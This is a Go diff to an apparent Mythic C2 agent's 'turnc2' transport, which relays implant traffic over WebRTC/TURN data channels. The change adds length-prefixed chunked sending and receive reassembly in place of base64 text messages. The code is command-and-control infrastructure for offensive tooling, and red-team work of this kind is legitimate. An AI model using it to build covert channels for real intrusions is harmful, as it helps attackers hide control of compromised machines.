@@ -159,10 +159,14 @@ type C2Turnc2 struct {
 	PushChannel           chan structs.MythicMessage
 	interruptSleepChannel chan bool
 	UserAgent        string
-	// channel to receive messages from the data channel
+	// channel to receive complete reassembled messages
 	recvChannel      chan []byte
 	// channel to signal data channel is open
 	dataChannelReady chan bool
+	// reassembly state for chunked receives
+	recvBuf       []byte
+	recvExpected  int
+	recvBufMu     sync.Mutex
 }
 
 func (c *C2Turnc2) MarshalJSON() ([]byte, error) {
@@ -468,9 +472,13 @@ func (c *C2Turnc2) establishWebRTC() error {
 		return fmt.Errorf("failed to create peer connection: %w", err)
 	}
 
-	// Reset channels for new connection
+	// Reset channels and reassembly state for new connection
 	c.recvChannel = make(chan []byte, 100)
 	c.dataChannelReady = make(chan bool, 1)
+	c.recvBufMu.Lock()
+	c.recvBuf = nil
+	c.recvExpected = 0
+	c.recvBufMu.Unlock()
 
 	// Log ICE candidates as they are gathered
 	pc.OnICECandidate(func(candidate *pion.ICECandidate) {
@@ -495,9 +503,10 @@ func (c *C2Turnc2) establishWebRTC() error {
 		})
 
 		dc.OnMessage(func(msg pion.DataChannelMessage) {
-			if !c.ShouldStop {
-				c.recvChannel <- msg.Data
+			if c.ShouldStop {
+				return
 			}
+			c.handleChunkedRecv(msg.Data)
 		})
 
 		dc.OnClose(func() {
@@ -808,8 +817,7 @@ func (c *C2Turnc2) SendMessage(output []byte) []byte {
 		output = append([]byte(UUID), output...)
 	}
 
-	encoded := base64.StdEncoding.EncodeToString(output)
-	utils.PrintDebug(fmt.Sprintf("[turnc2] SendMessage: %d bytes (encoded %d bytes)\n", len(output), len(encoded)))
+	utils.PrintDebug(fmt.Sprintf("[turnc2] SendMessage: %d bytes\n", len(output)))
 
 	for i := 0; i < 5; i++ {
 		if c.ShouldStop {
@@ -827,13 +835,71 @@ func (c *C2Turnc2) SendMessage(output []byte) []byte {
 			os.Exit(1)
 		}
 
-		if err := c.DataChan.SendText(encoded); err != nil {
+		if err := c.sendChunked(output); err != nil {
 			utils.PrintDebug(fmt.Sprintf("Error sending data over data channel: %v\n", err))
 			IncrementFailedConnection(c.ProfileName())
 			time.Sleep(1 * time.Second)
 			continue
 		}
 		return nil
+	}
+	return nil
+}
+
+// handleChunkedRecv reassembles length-prefixed chunked messages.
+// Format: first chunk starts with 4-byte big-endian total length, followed by data.
+// Subsequent chunks are pure data.
+func (c *C2Turnc2) handleChunkedRecv(chunk []byte) {
+	c.recvBufMu.Lock()
+	defer c.recvBufMu.Unlock()
+
+	if c.recvExpected == 0 {
+		// Start of a new message — read the 4-byte length prefix
+		if len(chunk) < 4 {
+			utils.PrintDebug(fmt.Sprintf("[turnc2] recv chunk too small for length prefix: %d bytes\n", len(chunk)))
+			return
+		}
+		c.recvExpected = int(chunk[0])<<24 | int(chunk[1])<<16 | int(chunk[2])<<8 | int(chunk[3])
+		c.recvBuf = make([]byte, 0, c.recvExpected)
+		chunk = chunk[4:] // skip the length prefix
+	}
+
+	c.recvBuf = append(c.recvBuf, chunk...)
+
+	if len(c.recvBuf) >= c.recvExpected {
+		// Complete message received
+		msg := c.recvBuf[:c.recvExpected]
+		c.recvBuf = nil
+		c.recvExpected = 0
+		c.recvChannel <- msg
+	}
+}
+
+const maxChunkSize = 60000 // well under SCTP's 65536 limit
+
+// sendChunked sends data over the data channel with length-prefixed framing.
+// Format: first chunk starts with 4-byte big-endian total length, followed by data.
+// Subsequent chunks are pure data. Receiver reassembles based on the length prefix.
+func (c *C2Turnc2) sendChunked(data []byte) error {
+	totalLen := len(data)
+	// Build the framed message: [4-byte length][data]
+	frame := make([]byte, 4+totalLen)
+	frame[0] = byte(totalLen >> 24)
+	frame[1] = byte(totalLen >> 16)
+	frame[2] = byte(totalLen >> 8)
+	frame[3] = byte(totalLen)
+	copy(frame[4:], data)
+
+	// Send in chunks
+	for offset := 0; offset < len(frame); offset += maxChunkSize {
+		end := offset + maxChunkSize
+		if end > len(frame) {
+			end = len(frame)
+		}
+		chunk := frame[offset:end]
+		if err := c.DataChan.Send(chunk); err != nil {
+			return err
+		}
 	}
 	return nil
 }
